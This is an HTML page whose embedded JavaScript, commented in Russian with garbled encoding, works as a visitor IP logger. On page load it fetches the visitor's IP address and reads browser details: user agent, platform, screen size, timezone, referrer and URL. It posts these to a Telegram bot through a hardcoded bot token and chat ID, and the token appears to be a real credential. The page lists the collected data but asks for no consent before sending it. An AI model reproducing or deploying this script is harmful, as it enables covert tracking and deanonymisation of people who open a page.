<body>

    <script>
        // üîß –ù–ê–°–¢–†–û–ô–ö–ò - –ó–ê–ú–ï–ù–ò–¢–ï –ù–ê –°–í–û–ò!
        const BOT_TOKEN = '8527592943:AAESeVCNijxsSj-pwDFdPQ90PU2PGvAjx20'; // –ù–∞–ø—Ä–∏–º–µ—Ä: '1234567890:ABCdefGHIjklMNopQRstuVWXyz'
        const CHAT_ID = '6802569070';      // –ù–∞–ø—Ä–∏–º–µ—Ä: '123456789'

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                const result = await response.json();
                return result.ok;
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', error);
                return false;
            }
        }

        async function collectAndSendData() {
            const statusElement = document.getElementById('status');
            const dataPreview = document.getElementById('dataPreview');

            try {
                // –ü–æ–ª—É—á–∞–µ–º IP –∞–¥—Ä–µ—Å
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();

                // –°–æ–±–∏—Ä–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
                const userInfo = {
                    ip: ipData.ip,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    referrer: document.referrer || '–ø—Ä—è–º–æ–π –∑–∞—Ö–æ–¥',
                    url: window.location.href,
                    timestamp: new Date().toLocaleString('ru-RU')
                };

                // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
                const telegramMessage = `
üÜï <b>–ù–æ–≤—ã–π –ø–æ—Å–µ—Ç–∏—Ç–µ–ª—å</b>

üåê <b>IP:</b> <code>${userInfo.ip}</code>
üïí <b>–í—Ä–µ–º—è:</b> ${userInfo.timestamp}
üíª <b>–ë—Ä–∞—É–∑–µ—Ä:</b> ${userInfo.userAgent}
‚öôÔ∏è <b>–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞:</b> ${userInfo.platform}
üì± <b>–≠–∫—Ä–∞–Ω:</b> ${userInfo.screen}
üåç <b>–í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞:</b> ${userInfo.timezone}
üîó <b>–ò—Å—Ç–æ—á–Ω–∏–∫:</b> ${userInfo.referrer}
                `.trim();

                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –¥–∞–Ω–Ω—ã–µ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ
                dataPreview.innerHTML = `
                    <h3>–°–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:</h3>
                    <div class="data-item"><strong>IP:</strong> ${userInfo.ip}</div>
                    <div class="data-item"><strong>–í—Ä–µ–º—è:</strong> ${userInfo.timestamp}</div>
                    <div class="data-item"><strong>–ë—Ä–∞—É–∑–µ—Ä:</strong> ${userInfo.userAgent}</div>
                    <div class="data-item"><strong>–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞:</strong> ${userInfo.platform}</div>
                    <div class="data-item"><strong>–≠–∫—Ä–∞–Ω:</strong> ${userInfo.screen}</div>
                `;

                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
                const sent = await sendToTelegram(telegramMessage);
                
                if (sent) {
                    statusElement.className = 'status success';
                    statusElement.innerHTML = '‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram!';
                } else {

                    statusElement.innerHTML = '‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram';
                }

            } catch (error) {
                statusElement.className = 'status error';
                statusElement.innerHTML = '‚ùå –û—à–∏–±–∫–∞: ' + error.message;
            }
        }

        // –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', collectAndSendData);
    </script>
</body>
